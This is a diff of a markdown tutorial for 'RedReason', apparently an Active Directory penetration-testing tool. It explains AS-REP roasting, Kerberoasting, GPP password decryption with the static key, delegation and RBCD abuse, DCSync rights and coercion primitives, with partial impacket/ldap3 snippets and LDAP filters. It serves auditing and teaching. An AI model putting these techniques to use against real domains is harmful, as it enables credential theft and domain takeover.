@@ -1,157 +1,218 @@
-# RedReason Attack Tutorial
+# RedReason Technical Tutorial
 
-This document explains the active directory attacks implemented in **RedReason** and provides code snippets showing how they are programmatically executed using Python (`impacket` and `ldap3`).
-
----
-
-## 1. AS-REP Roasting
-
-**Concept**: Users with the `DONT_REQ_PREAUTH` flag enabled do not require Kerberos Pre-Authentication. An attacker can request a TGT for these users and crack the encrypted part of the response (AS-REP) to recover the password.
-
-**Code Snippet (`modules/ad_attacks.py`)**:
-```python
-def check_asrep_roasting(self):
-    # 1. Search for vulnerable users
-    # Filter: userAccountControl bit 4194304 (DONT_REQ_PREAUTH)
-    search_filter = "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
-    self.conn.search(self.conn.server.info.other['defaultNamingContext'][0], search_filter, attributes=['sAMAccountName'])
-    
-    for entry in self.conn.entries:
-        username = str(entry.sAMAccountName)
-        
-        # 2. Request TGT without Pre-Auth
-        clientName = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-        # no_preauth=True is key here
-        tgt, cipher, _, _ = getKerberosTGT(clientName, '', self.domain, None, None, no_preauth=True)
-        
-        # 3. Format hash for cracking (hashcat format 23)
-        hash_line = f"$krb5asrep$23${username}@{self.domain}:<checksum>$<encpart>"
-```
+This document explains the technical implementation of **RedReason**'s capabilities, covering Enumeration, Vulnerability Checks, and Attack Vectors. It includes code snippets demonstrating how these are executed programmatically using `impacket` and `ldap3`.
 
 ---
 
-## 2. Kerberoasting
+# Part 1: Enumeration
 
-**Concept**: Any valid user can request a TGS (Ticket Granting Service) ticket for any service with an SPN (Service Principal Name). The TGS is encrypted with the service account's password hash (NTLM). An attacker can request these tickets and crack them offline.
+## 1. User Enumeration (Detailed)
+**Concept**: Enumerating users goes beyond just listing names. We analyze attributes to assess risk, including `userAccountControl` (UAC) flags, password age, and potential secrets in descriptions.
 
-**Code Snippet (`modules/ad_attacks.py`)**:
-```python
-def check_kerberoasting(self):
-    # 1. Search for users with Service Principal Names (SPNs)
-    # Exclude krbtgt account
-    search_filter = "(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=krbtgt)))"
-    self.conn.search(..., search_filter, attributes=['sAMAccountName', 'servicePrincipalName'])
-    
-    for entry in self.conn.entries:
-        spn = entry.servicePrincipalName[0]
-        
-        # 2. Authenticate self (Get TGT)
-        clientName = Principal(self.user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-        tgt, cipher, _, sessionKey = getKerberosTGT(clientName, self.password, self.domain, ...)
-        
-        # 3. Request TGS for the Target SPN
-        serverName = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
-        tgs, cipher, _, _ = getKerberosTGS(serverName, self.domain, None, tgt, cipher, sessionKey)
-        
-        # 4. Save TGS-REP hash for cracking
+```mermaid
+graph TD
+    A[Attacker] -->|LDAP Search| B(Domain Controller)
+    B -->|Return Objects| A
+    A -->|Analyze Attributes| C{Risk Assessment}
+    C -->|userAccountControl| D[AS-REP Roastable?]
+    C -->|description| E[Passwords Found?]
+    C -->|badPwdCount| F[Brute Force Target?]
 ```
-
----
-
-## 3. Deployment Abuse (Unconstrained)
-
-**Concept**: If a computer is trusted for **Unconstrained Delegation**, any TGT sent to it by a user (e.g., via SMB or HTTP) is stored in memory. If a Domain Admin connects to this machine, their TGT can be harvested.
-
-**Code Snippet (`modules/ad_attacks.py`)**:
-```python
-def check_delegation_abuse(self):
-    # Search Filter for Unconstrained Delegation
-    # userAccountControl bit 524288 (TRUSTED_FOR_DELEGATION)
-    ud_filter = "(&(userAccountControl:1.2.840.113556.1.4.803:=524288)(objectClass=computer))"
-    
-    self.conn.search(..., ud_filter, attributes=['dNSHostName'])
-    
-    for entry in self.conn.entries:
-        print(f"VULNERABLE: {entry.dNSHostName}")
-        # Reasoning: "Attacker can coerce authentication (e.g. SpoolSample) and capture TGTs."
-```
-
----
-
-## 4. GPP Password Hunting
-
-**Concept**: Older Group Policy Preferences (GPP) stored passwords in "cpassword" fields in XML files within SYSVOL. These were encrypted with a static AES key published by Microsoft (making them effectively cleartext).
-
-**Code Snippet (`modules/ad_attacks.py`)**:
-```python
-def check_gpp_passwords(self):
-    # 1. Connect to SYSVOL via SMB
-    smb = SMBConnection(self.target, self.target)
-    
-    # 2. Walk directories looking for XMLs
-    # (Groups.xml, Services.xml, etc.)
-    files = smb.listPath('SYSVOL', 'domain/Policies/*') 
-    
-    # 3. Extract cpassword and decrypt
-    # Key is static and public
-    GPP_KEY = unhexlify('4e9906e8fcb66cc9faf49310620fe8682ed387d130f429438e9e2448007d136e')
-    
-    cipher = AES.new(GPP_KEY, AES.MODE_CBC, iv=b'\x00'*16)
-    decrypted = cipher.decrypt(base64.b64decode(cpassword))
-```
-
----
-
-## 5. SMB Signing Not Required
-
-**Concept**: If SMB Signing is not required (often on workstations, sometimes servers), an attacker can perform **NTLM Relaying**. They intercept an authentication attempt and relay it to the vulnerable target to execute code or access files.
-
-**Code Snippet (`modules/ad_attacks.py`)**:
-```python
-def check_smb_signing(self):
-    # Check SMB configuration on target
-    smb = SMBConnection(self.target, self.target)
-    smb.login(self.user, self.password, self.domain)
-    
-    # Check boolean flag
-    if not smb.isSigningRequired():
-        print(f"VULNERABLE: SMB Signing NOT required on {self.target}")
-        # This target is a valid candidate for ntlmrelayx.py
-
-```
-## 6. Resource-Based Constrained Delegation (RBCD)
-
-**Concept**: RBCD allows a computer object to decide which other accounts can delegate to it. This is stored in the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute (Binary Security Descriptor). If an attacker controls an account listed in this SD, they can gain admin access to the target computer.
-
-**Code Snippet (`modules/ad_attacks.py`)**:
-```python
-def check_rbcd(self):
-    # Filter for objects with the attribute set
-    search_filter = "(&(msDS-AllowedToActOnBehalfOfOtherIdentity=*)(objectClass=computer))"
-    self.conn.search(..., search_filter, attributes=['msDS-AllowedToActOnBehalfOfOtherIdentity'])
-    
-    for entry in self.conn.entries:
-        raw_sd = entry['msDS-AllowedToActOnBehalfOfOtherIdentity']
-        # Parse the Security Descriptor (SD)
-        sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=raw_sd)
-        for ace in sd['Dacl'].aces:
-            sid = ace['Ace']['Sid'].formatCanonical()
-            print(f"Principal {sid} can compromise this host via RBCD.")
-```
-
----
-
-## 7. DCSync Rights (ACL Abuse)
-
-**Concept**: The rights `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` on the Domain Object allow an account to replicate secrets (hashes) from the Domain Controller (DCSync). This is normally restricted to DCs, but sometimes regular users or service accounts are granted this, creating a huge backdoor.
 
 **Code Snippet (`modules/ad_enum.py`)**:
 ```python
-def check_dcsync_rights(self):
-    # Get Domain Root SD
-    self.conn.search(root_dn, "(objectClass=domain)", attributes=['nTSecurityDescriptor'])
+def get_users_detailed(self):
+    # Search for all person objects
+    search_filter = "(&(objectClass=user)(objectCategory=person))"
+    # Key Attributes:
+    # - description: Often contains default passwords.
+    # - pwdLastSet: Calculate password age.
+    # - badPwdCount: Identify brute-force attempts.
+    # - userAccountControl: Bitmask for account status (Disabled, Locked, No-PreAuth).
+    attributes = ['sAMAccountName', 'description', 'pwdLastSet', 'badPwdCount', 'userAccountControl', 'adminCount']
     
-    # Parse ACLs looking for specific GUIDs (Simplified View)
-    # DS-Replication-Get-Changes: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
-    # In practice, this requires careful parsing of ACEs and ObjectTypes.
+    self.conn.search(self.conn.server.info.other['defaultNamingContext'][0], search_filter, attributes=attributes)
+    
+    for entry in self.conn.entries:
+        # Check UAC Flags
+        uac = entry.userAccountControl
+        if uac and (uac & 0x00040000): # DONT_REQ_PREAUTH
+            print(f"VULNERABLE: {entry.sAMAccountName} (AS-REP Roastable)")
 ```
+
+## 2. Blind User Enumeration (No Credentials)
+**Concept**: If we lack credentials, we can't use LDAP. However, we can use the Kerberos protocol (Port 88) to verify if a user exists. If we ask for a TGT without Pre-Authentication, the KDC responds differently based on whether the user exists, doesn't exist, or requires Pre-Auth.
+
+**Code Snippet (`modules/ad_enum.py`)**:
+```python
+def verify_user_kerberos(self):
+    # Request TGT with NO Pre-Auth
+    clientName = Principal(self.user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+    tgt, cipher, _, _ = getKerberosTGT(clientName, '', self.domain, None, None, no_preauth=True)
+    
+    # Outcomes:
+    # 1. TGT Received -> User Exists AND is AS-REP Roastable!
+    # 2. KDC_ERR_PREAUTH_REQUIRED -> User Exists (Standard security).
+    # 3. KDC_ERR_C_PRINCIPAL_UNKNOWN -> User Does Not Exist.
+```
+
+## 3. Group Membership (High-Value Targets)
+**Concept**: Identifies members of high-privilege groups. Beyond "Domain Admins", we check "Remote Desktop Users" (lateral movement), "Backup Operators" (file access), etc.
+
+**Code Snippet**:
+```python
+def get_group_members(self):
+    groups = ["Domain Admins", "Enterprise Admins", "Backup Operators", "Remote Desktop Users"]
+    for group in groups:
+        # Search for group by CN and list 'member' attribute
+        self.conn.search(default_nc, f"(&(objectClass=group)(cn={group}))", attributes=['member'])
+```
+
+## 4. Domain Password Policy
+**Concept**: Reads the root domain object for password complexity rules to assess brute-force feasibility.
+
+**Attributes Checked**:
+-   `minPwdLength`
+-   `pwdProperties` (Complexity on/off)
+-   `lockoutThreshold` (Account lockout limit)
+
+## 5. Domain Trusts
+**Concept**: Maps relationships with other domains (Inbound/Outbound) to identify lateral movement paths between forests.
+
+**Code Snippet**:
+```python
+def get_domain_trusts(self):
+    # Class 'trustedDomain' holds trust info
+    self.conn.search(default_nc, "(objectClass=trustedDomain)", attributes=['flatName', 'trustDirection', 'trustAttributes'])
+```
+
+---
+
+# Part 2: Vulnerability & Hygiene Checks
+
+## 1. LAPS (Local Admin Password Solution)
+**Concept**: Checks if the LAPS attribute `ms-Mcs-AdmPwd` is readable. If configured incorrectly, regular users might be able to read local admin passwords of computers.
+
+**Code Snippet**:
+```python
+def check_laps(self):
+    # Search computers with the LAPS attribute visible
+    self.conn.search(default_nc, "(&(objectClass=computer)(ms-Mcs-AdmPwd=*))", attributes=['dNSHostName', 'ms-Mcs-AdmPwd'])
+```
+
+## 2. AD CS (Active Directory Certificate Services)
+**Concept**: Enumerates Certificate Authorities and Templates. Unsecured templates (ESC1) or HTTP enrollment endpoints (ESC8) allow privilege escalation or NTLM relaying.
+
+**Code Snippet (`modules/ad_enum.py`)**:
+```python
+def check_adcs_templates(self):
+    # Search Configuration Partition for pKICertificateTemplate
+    self.conn.search(config_nc, "(objectClass=pKICertificateTemplate)", attributes=['msPKI-Certificate-Name-Flag', ...])
+    
+    # Check for ESC1:
+    # 1. Enrollee Supplies Subject (0x00000001)
+    # 2. Client Authentication EKU
+    # 3. No Manager Approval
+```
+
+## 3. Service Account Risks (Hygiene)
+**Concept**: Identifies service accounts (with SPNs) that are also members of Admin groups ("Shadow Admins"). Also checks for stale passwords (> 1 year).
+
+**Code Snippet**:
+```python
+def check_service_account_risks(self):
+    # Find admins (from group enum) and check if they have 'servicePrincipalName'
+    # High Risk: Admin Service Account = Kerberoastable Admin!
+```
+
+## 4. Legacy Protocols (RC4)
+**Concept**: Identifies accounts capable of only RC4 encryption, which is weaker and implies older systems.
+
+**Code Snippet**:
+```python
+def check_kerberos_encryption_types(self):
+    # msDS-SupportedEncryptionTypes attribute
+    # If missing or set to 0/4 (RC4 only), it's legacy.
+```
+
+## 5. AdminSDHolder
+**Concept**: Checks the ACL of the `AdminSDHolder` object. This object's permissions are applied to all protected groups (Domain Admins, etc.) every hour. Attackers add themselves here for persistence.
+
+## 6. Machine Account Quota (MAQ)
+**Concept**: Checks `ms-DS-MachineAccountQuota`. If > 0 (default 10), any user can create computer accounts, facilitating RBCD and Shadow Credentials attacks.
+
+---
+
+# Part 3: Attack Vectors
+
+## 1. AS-REP Roasting
+**Concept**: Users with `DONT_REQ_PREAUTH` allow any attacker to request a TGT and crack the session key offline.
+
+```mermaid
+sequenceDiagram
+    participant A as Attacker
+    participant K as KDC (DC)
+    A->>K: AS-REQ (No Pre-Auth)
+    Note right of A: User has DONT_REQ_PREAUTH
+    K->>A: AS-REP (Encrypted with User's NTLM)
+    Note left of A: Crack Encrypted Part Offline
+```
+
+**Target**: `userAccountControl:1.2.840.113556.1.4.803:=4194304`
+
+## 2. Kerberoasting
+**Concept**: Any user can request a TGS for a service account (SPN). The ticket is encrypted with the service account's NTLM hash.
+
+```mermaid
+sequenceDiagram
+    participant A as Attacker
+    participant K as KDC (DC)
+    A->>K: TGS-REQ (Targeting SPN)
+    K->>A: TGS-REP (Encrypted with Service's NTLM)
+    Note left of A: Crack ST Ticket Offline
+```
+
+**Target**: `(&(objectClass=user)(servicePrincipalName=*))`
+
+## 3. Delegation Abuse
+-   **Unconstrained**: Computer trusts meant to store TGTs.
+    -   Target: `userAccountControl` bit `TRUSTED_FOR_DELEGATION`.
+-   **Constrained**: `msDS-AllowedToDelegateTo`.
+-   **RBCD**: `msDS-AllowedToActOnBehalfOfOtherIdentity`.
+
+```mermaid
+graph LR
+    A[Attacker] -->|Compromise| B(Service Account)
+    B -->|S4U2Self / S4U2Proxy| C(Target Computer)
+    C -->|Checks RBCD ACL| D{Allowed?}
+    D -- Yes --> E[Grant Access as ANY User]
+```
+
+## 4. GPP Password Hunting
+**Concept**: Decrypts `cpassword` fields found in XML files (Groups.xml, etc.) in SYSVOL using the static Microsoft AES key.
+
+## 5. SMB Signing Checks
+**Concept**: Checks if SMB Signing is *disabled* on the target (usually safe on DCs, but check anyway). If disabled, enables NTLM Relaying.
+
+## 6. DCSync Rights (ACL Abuse)
+**Concept**: Identifies principals with `DS-Replication-Get-Changes` rights on the Domain Root, effectively making them Shadow Domain Controllers.
+
+```mermaid
+graph TD
+    A[Attacker] -->|Has DCSync Rights| B(Domain Controller)
+    B -->|DRSGetNCChanges| A
+    A -->|Replicates Secrets| C[Dump NTLM Hashes]
+```
+
+**Code Snippet**:
+```python
+def check_dcsync_rights(self):
+    # Parsing nTSecurityDescriptor for GUIDs:
+    # 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 (Get Changes)
+    # 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 (Get Changes All)
+```
+
+## 7. Coercion Primitives
+**Concept**: Checks for services that can be forced to authenticate to an attacker machine (for Relay/RBCD).
+-   **PetitPotam**: Exposed `EFSRPC` named pipe.
+-   **PrinterBug**: Running Print Spooler service (`spoolss`).
